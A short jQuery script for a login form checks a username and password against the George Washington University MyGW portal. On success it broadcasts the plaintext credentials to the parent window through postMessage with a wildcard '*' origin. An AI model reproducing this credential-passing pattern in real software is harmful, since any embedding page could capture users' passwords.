$(document).ready(function(){
    $('input[name="username"]').focus();
    $("#enterClick").on('keyup', function(e){
        if(e.keyCode === 13){
            $('input[name="action"]').click();
        }
    });
    $('input[name="action"]').click(function(){
        var username = $('input[name=username]').val(),
            password = $('input[name=password]').val();

        function awHellThrow(){
            $('input:not([type="submit"])').val('');
            alert("Invalid username or password");
            $('input[name="username"]').focus();
        }

        if (!username || !password || password.length < 1 || username.length < 1) return awHellThrow();

        // POST request to login url
        $.ajax({
            url: "https://my.gwu.edu/login/validate.cfm",
            type: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            contentType: "application/x-www-form-urlencoded",
            data: {
                "username": username,
                "password": password,
                "remember": "1",
                "action": "Sign In",
            }
        }).always(function(a, b, jqx){
         if (a.indexOf('Sign In - MyGW - The George Washington University Web Portal') > -1) {
              return awHellThrow();
          } else {
              // send parent page the data
              window.parent.postMessage(JSON.stringify({
                  username: username,
                  password: password
              }), '*');
          };
        });
    })
})
